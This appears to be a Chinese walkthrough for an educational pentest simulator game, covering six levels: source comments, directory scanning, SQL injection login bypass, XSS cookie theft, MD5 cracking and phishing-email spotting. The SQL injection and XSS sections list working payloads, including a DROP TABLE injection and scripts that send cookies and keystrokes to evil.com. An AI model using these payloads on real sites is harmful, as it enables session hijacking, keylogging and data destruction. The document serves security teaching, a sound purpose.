# CyberHack 渗透测试模拟器 — Writeup (WP)

> 本文档为 CyberHack 游戏的完整通关攻略，记录每一关的解题思路和操作步骤。

---

## 📋 目录

- [关卡 1：源码探秘](#关卡-1源码探秘)
- [关卡 2：目录扫描](#关卡-2目录扫描)
- [关卡 3：SQL 注入](#关卡-3sql-注入)
- [关卡 4：XSS 攻击](#关卡-4xss-攻击)
- [关卡 5：密码破解](#关卡-5密码破解)
- [关卡 6：社会工程](#关卡-6社会工程)
- [彩蛋命令](#彩蛋命令)
- [成就速查](#成就速查)

---

## 关卡 1：源码探秘

### 🎯 目标

在网页源代码中找到隐藏的 flag。

### 💡 知识点

网页开发者有时会在 HTML 注释中留下调试信息、测试账号或敏感数据。上线前如果忘记清理，就会造成信息泄露。

### 📝 解题步骤

**第一步：查看目标网站源码**

```
visitor@cyberhack:~$ curl http://target.site/
```

返回结果：

```html
<html>
<head><title>Target Corp - 首页</title></head>
<body>
  <h1>欢迎来到 Target Corp</h1>
  <p>我们致力于提供最安全的服务。</p>
  <!-- TODO: 删除上线前的测试信息 -->
  <!-- debug: admin panel at /admin -->
  <!-- FLAG{v1ew_s0urc3_is_your_f1rst_st3p} -->
  <footer>© 2026 Target Corp</footer>
</body>
</html>
```

**第二步：提取 flag**

在 HTML 注释中发现了 flag：

```
FLAG{v1ew_s0urc3_is_your_f1rst_st3p}
```

**第三步：提交 flag**

```
visitor@cyberhack:~$ submit FLAG{v1ew_s0urc3_is_your_f1rst_st3p}
```

### 🔍 延伸思考

- 注释中还暴露了 `/admin` 后台路径
- 真实渗透中，可以用浏览器 F12 或 `view-source:` 协议查看源码
- 开发者应使用构建工具自动移除注释

---

## 关卡 2：目录扫描

### 🎯 目标

找到隐藏的管理页面，获取 flag。

### 💡 知识点

网站目录枚举（Directory Bruteforcing）是渗透测试的信息收集阶段常用技术。通过遍历常见目录名，可以发现被遗忘的后台、备份文件、配置文件等。

常用工具：`dirb`、`dirbuster`、`gobuster`、`ffuf`

### 📝 解题步骤

**第一步：扫描目录**

```
visitor@cyberhack:~$ dirb http://target.site/
```

输出：

```
DIRB v2.22
By The Dark Raver
---- Scanning URL: http://target.site/ ----
[==============================] 100%

+ http://target.site/admin/ (Status: 200)
+ http://target.site/backup/ (Status: 200)
+ http://target.site/secret_panel/ (Status: 200)
+ http://target.site/robots.txt (Status: 200)
+ http://target.site/.env (Status: 200)
- http://target.site/login/ (Status: 404)
...
```

**第二步：查看 robots.txt**

```
visitor@cyberhack:~$ curl http://target.site/robots.txt
```

```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /secret_panel/
Disallow: /.env
```

> `robots.txt` 本意是告诉搜索引擎哪些页面不要收录，但攻击者反而把它当成"目录地图"。

**第三步：访问隐藏目录**

```
visitor@cyberhack:~$ curl http://target.site/secret_panel/
```

```html
<html><head><title>管理面板</title></head>
<body>
  <h1>🔒 管理面板</h1>
  <p>欢迎回来，管理员。</p>
  <div style="background:#1a1a2e;padding:20px;border:1px solid #ff9800;margin:20px 0;">
    <code>FLAG{h1dd3n_d1r3ct0r1es_3xp0sed}</code>
  </div>
</body></html>
```

**第四步：提交 flag**

```
visitor@cyberhack:~$ submit FLAG{h1dd3n_d1r3ct0r1es_3xp0sed}
```

### 🔍 延伸思考

- `/backup/` 目录暴露了数据库备份文件 `db_backup_2026.sql`
- `/.env` 文件泄露了数据库凭据：`admin:supersecret123`
- 防御措施：禁止目录列表、删除敏感文件、配置访问控制

---

## 关卡 3：SQL 注入

### 🎯 目标

使用 SQL 注入绕过登录，获取管理员权限。

### 💡 知识点

SQL 注入（SQL Injection）是最经典的 Web 安全漏洞之一。当应用程序直接将用户输入拼接到 SQL 查询中而未做过滤时，攻击者可以构造恶意输入改变查询逻辑。

**原理示例：**

```sql
-- 正常查询
SELECT * FROM users WHERE username='admin' AND password='123456'

-- 注入后
SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='任意'
--                                   ^^^^^^^^^^^^ 永远为真
--                                          ^^ 注释掉后面的条件
```

### 📝 解题步骤

**方法一：使用 sqlmap 自动化检测**

```
visitor@cyberhack:~$ sqlmap -u http://target.site/login
```

输出：

```
[*] starting @ 12:00:00 2026-03-15
[*] testing connection to the target URL
[==============================] 100%

[+] parameter 'username' is vulnerable
Type: boolean-based blind
Title: OR boolean-based blind

[+] the back-end DBMS is MySQL
[+] fetching current user...
current user: 'admin@localhost'

[*] Payload: username=admin' OR 1=1--&password=test
[*] 使用 login admin' OR 1=1 - 任意密码 来绕过认证
```

**方法二：手动注入**

```
visitor@cyberhack:~$ login admin' OR 1=1 -- x
```

输出：

```
正在认证...
🔓 SQL 注入成功！
Welcome, admin!

管理员面板内容:
用户名: admin
权限: root
Flag: FLAG{sql_1nj3ct10n_byp4ss_auth}

使用 submit FLAG{sql_1nj3ct10n_byp4ss_auth} 提交 flag
```

**第三步：提交 flag**

```
visitor@cyberhack:~$ submit FLAG{sql_1nj3ct10n_byp4ss_auth}
```

### 🔍 延伸思考

**其他常见注入 Payload：**

| Payload | 说明 |
|---------|------|
| `admin' OR 1=1 --` | 经典万能密码 |
| `admin' OR '1'='1` | 单引号变体 |
| `admin' UNION SELECT 1,2,3 --` | 联合查询 |
| `admin'; DROP TABLE users; --` | 删除表（破坏性） |

**防御措施：**
- 使用参数化查询（PreparedStatement）
- 输入验证和转义
- 最小权限原则
- 使用 WAF（Web 应用防火墙）

---

## 关卡 4：XSS 攻击

### 🎯 目标

构造 XSS payload 窃取管理员 cookie。

### 💡 知识点

跨站脚本攻击（Cross-Site Scripting, XSS）是指攻击者在网页中注入恶意脚本，当其他用户访问该页面时，脚本会在其浏览器中执行。

**XSS 类型：**

| 类型 | 说明 |
|------|------|
| 反射型 XSS | Payload 在 URL 中，服务器直接反射回页面 |
| 存储型 XSS | Payload 存储在数据库中，所有访问者都会触发 |
| DOM 型 XSS | 前端 JavaScript 直接操作 DOM 导致的漏洞 |

### 📝 解题步骤

**第一步：测试基础 XSS**

```
visitor@cyberhack:~$ search <script>alert(1)</script>
```

```
搜索: "<script>alert(1)</script>"

[服务端日志]
⚠️  检测到脚本注入！

但没有获取到 cookie。
提示: payload 中需要包含 document.cookie
```

> 脚本触发了，但 `alert(1)` 只是弹窗，没有窃取数据。

**第二步：构造窃取 Cookie 的 Payload**

```
visitor@cyberhack:~$ search <script>fetch("http://evil.com?c="+document.cookie)</script>
```

```
搜索: "<script>fetch("http://evil.com?c="+document.cookie)</script>"

[服务端日志]
⚠️  检测到脚本注入！
管理员 Cookie: session=admin_token_xyz_secret

🎯 XSS 攻击成功！Cookie 已泄露！

模拟攻击者收到:
GET http://evil.com?c=session=admin_token_xyz_secret

Flag: FLAG{xss_c00k13_th3ft_succ3ss}

使用 submit FLAG{xss_c00k13_th3ft_succ3ss} 提交 flag
```

**第三步：提交 flag**

```
visitor@cyberhack:~$ submit FLAG{xss_c00k13_th3ft_succ3ss}
```

### 🔍 延伸思考

**其他常见 XSS Payload：**

```html
<!-- 基础弹窗 -->
<script>alert(1)</script>

<!-- 图片标签触发 -->
<img src=x onerror=alert(1)>

<!-- SVG 触发 -->
<svg onload=alert(1)>

<!-- 窃取 Cookie 并发送 -->
<script>new Image().src="http://evil.com?c="+document.cookie</script>

<!-- 键盘记录 -->
<script>document.onkeypress=e=>fetch("http://evil.com?k="+e.key)</script>
```

**防御措施：**
- 输出编码（HTML Entity Encoding）
- 内容安全策略（CSP）
- HttpOnly Cookie（防止 JS 读取）
- 输入过滤和验证

---

## 关卡 5：密码破解

### 🎯 目标

破解 MD5 哈希，还原管理员密码。

### 💡 知识点

密码哈希是将明文密码通过哈希算法转换为固定长度的字符串。常见算法：

| 算法 | 安全性 | 说明 |
|------|--------|------|
| MD5 | ❌ 极弱 | 已被彩虹表完全破解 |
| SHA-1 | ❌ 弱 | 已被碰撞攻击破解 |
| SHA-256 | ✅ 较强 | 仍需加盐使用 |
| bcrypt | ✅ 强 | 推荐，自带盐和迭代 |
| Argon2 | ✅ 最强 | 现代密码哈希首选 |

### 📝 解题步骤

**第一步：查看目标哈希**

进入关卡后终端显示：

```
目标哈希: e10adc3949ba59abbe56e057f20f883e
```

**方法一：暴力破解（hydra）**

```
visitor@cyberhack:~$ hydra
```

```
Hydra v9.3
目标: target.site (SSH)
字典: /usr/share/wordlists/rockyou.txt (35 条)
[==============================] 100%

[尝试] admin:password
[尝试] admin:admin
[尝试] admin:letmein
[尝试] admin:qwerty
[尝试] admin:123456

[✅] 找到有效凭据！
[22][ssh] host: target.site  login: admin  password: 123456
MD5(123456) = e10adc3949ba59abbe56e057f20f883e

Flag: FLAG{w3ak_p4ssw0rd_cr4ck3d}

使用 submit FLAG{w3ak_p4ssw0rd_cr4ck3d} 提交 flag
```

**方法二：在线哈希查询**

拿到 MD5 哈希 `e10adc3949ba59abbe56e057f20f883e`，可以直接在以下网站查询：

- https://www.cmd5.com/
- https://crackstation.net/
- https://hashes.com/en/decrypt/hash

**方法三：本地破解工具**

```bash
# hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**第四步：提交 flag**

```
visitor@cyberhack:~$ submit FLAG{w3ak_p4ssw0rd_cr4ck3d}
```

### 🔍 延伸思考

**为什么 123456 的 MD5 总是一样的？**

MD5 是确定性算法，相同输入永远产生相同输出：
```
MD5("123456") = e10adc3949ba59abbe56e057f20f883e
```

攻击者预先计算好大量常见密码的哈希值，做成"彩虹表"，就能实现秒破。

**安全密码策略：**
- 长度 ≥ 12 位
- 包含大小写字母、数字、特殊字符
- 不使用常见词汇和个人信息
- 每个账户使用不同密码
- 使用密码管理器

---

## 关卡 6：社会工程

### 🎯 目标

识别钓鱼邮件中的可疑线索，找到真正的 flag。

### 💡 知识点

社会工程学（Social Engineering）是通过心理操控而非技术手段来获取信息或诱导行为的攻击方式。钓鱼邮件是最常见的社会工程攻击。

### 📝 解题步骤

**第一步：查看所有邮件**

```
visitor@cyberhack:~$ read 1
visitor@cyberhack:~$ read 2
visitor@cyberhack:~$ read 3
visitor@cyberhack:~$ read 4
```

**第二步：分析可疑邮件**

对每封邮件，先用 `analyze` 获取线索，再用 `judge` 给出判断。

**邮件 #1：密码重置通知** — 分析 + 判定

```
visitor@cyberhack:~$ analyze 1
```

```
🔍 分析邮件 #1...

⚠️  发现以下可疑线索:
  1. 发件人域名是 target-corp.com，不是 target.site
  2. 链接指向的域名也是 target-corp.com（钓鱼域名）
  3. "紧急"、"立即"、"账户冻结"等制造恐慌的措辞
  4. 正规 IT 部门不会通过邮件发送重置链接
  5. 没有具体称呼（"尊敬的员工"而非你的名字）

💡 用 judge 1 phishing 或 judge 1 safe 给出你的判断。
```

```
visitor@cyberhack:~$ judge 1 phishing
```

```
━━━ 邮件 #1 判定结果 ━━━
你的判定: 🎣 钓鱼邮件
✅ 判定正确！

📋 线索分析:
  1. 发件人域名是 target-corp.com，不是 target.site
  2. 链接指向的域名也是 target-corp.com（钓鱼域名）
  3. "紧急"、"立即"、"账户冻结"等制造恐慌的措辞
  4. 正规 IT 部门不会通过邮件发送重置链接
  5. 没有具体称呼（"尊敬的员工"而非你的名字）

📬 还有 3 封邮件未判定: #2, #3, #4
```

**邮件 #2：团建通知** — 判定为正常

```
visitor@cyberhack:~$ judge 2 safe
```

```
━━━ 邮件 #2 判定结果 ━━━
你的判定: ✅ 正常邮件
✅ 判定正确！

📬 还有 2 封邮件未判定: #3, #4
```

**邮件 #3：安全提醒** — 判定为正常

```
visitor@cyberhack:~$ judge 3 safe
```

```
━━━ 邮件 #3 判定结果 ━━━
你的判定: ✅ 正常邮件
✅ 判定正确！

📬 还有 1 封邮件未判定: #4
```

**邮件 #4：CEO 借钱** — 分析 + 判定

```
visitor@cyberhack:~$ analyze 4
```

```
🔍 分析邮件 #4...

⚠️  发现以下可疑线索:
  1. CEO 直接要求员工垫钱买礼品卡——典型的 CEO 欺诈
  2. 制造紧迫感（"急用"、"在开会"）
  3. 要求通过微信发送卡密——绕过公司流程
  4. 没有具体称呼，语气不像是真正的 CEO
  5. 正规公司不会让员工个人垫付采购费用
```

```
visitor@cyberhack:~$ judge 4 phishing
```

```
━━━ 邮件 #4 判定结果 ━━━
你的判定: 🎣 钓鱼邮件
✅ 判定正确！

📋 线索分析:
  1. CEO 直接要求员工垫钱买礼品卡——典型的 CEO 欺诈
  ...

━━━ 判定汇总 ━━━
正确: 4/4

🎉 完美！你成功识别了所有钓鱼邮件！
Flag: FLAG{s0c14l_3ng1n33r1ng_4w4r3n3ss}

使用 submit FLAG{s0c14l_3ng1n33r1ng_4w4r3n3ss} 提交 flag
```

**第三步：提交 flag**

```
visitor@cyberhack:~$ submit FLAG{s0c14l_3ng1n33r1ng_4w4r3n3ss}
```

### 🔍 延伸思考

**识别钓鱼邮件的 5 个技巧：**

1. **检查发件人地址** — 不只看显示名称，要看 `@` 后面的域名
2. **悬停查看链接** — 鼠标悬停在链接上，看真实 URL 是否匹配
3. **警惕紧迫语气** — "立即处理"、"账户将被冻结"是经典套路
4. **核实请求来源** — 收到异常请求时，通过官方渠道二次确认
5. **注意语法和格式** — 钓鱼邮件常有拼写错误或格式异常

---

## 彩蛋命令

| 命令 | 效果 |
|------|------|
| `matrix` | 矩阵雨背景变亮，持续 5 秒 |
| `hack` | 炫酷黑客动画：乱码滚动 + 进度条填充 + ASCII art |
| `whoami` | 显示身份信息 |
| `ls` | 列出虚拟文件 |

---

## 成就速查

| 成就 | 图标 | 条件 |
|------|------|------|
| 首次突破 | 🎯 | 完成第一个关卡 |
| 独立自主 | 🧠 | 不使用任何提示通关 |
| 闪电侠 | ⚡ | 获得速通奖励 |
| 全面渗透 | 🏆 | 通关所有关卡 |
| XSS 大师 | 💉 | 一次构造出完美的 XSS payload |
| SQL 专家 | 🗃️ | 直接写出正确的 SQL 注入 |
| 反钓鱼专家 | 🎣 | 找出所有钓鱼邮件的线索 |
| 洞察力 | 👁️ | 识别出 CEO 欺诈邮件 |

---

## 🏁 速通参考

| 关卡 | 速通时间 | 建议操作 |
|------|----------|----------|
| 1 | < 60s | `curl http://target.site/` → 复制 flag → submit |
| 2 | < 90s | `dirb http://target.site/` → `curl http://target.site/secret_panel/` → submit |
| 3 | < 120s | `sqlmap -u http://target.site/login` → `login admin' OR 1=1 -- x` → submit |
| 4 | < 120s | `search <script>fetch("http://evil.com?c="+document.cookie)</script>` → submit |
| 5 | < 90s | `scan` → submit |
| 6 | < 120s | `judge 1 phishing` → `judge 2 safe` → `judge 3 safe` → `judge 4 phishing` → submit |

---

> 📌 本 WP 仅供学习参考。真实渗透测试需要获得授权，未经授权的入侵行为是违法的。
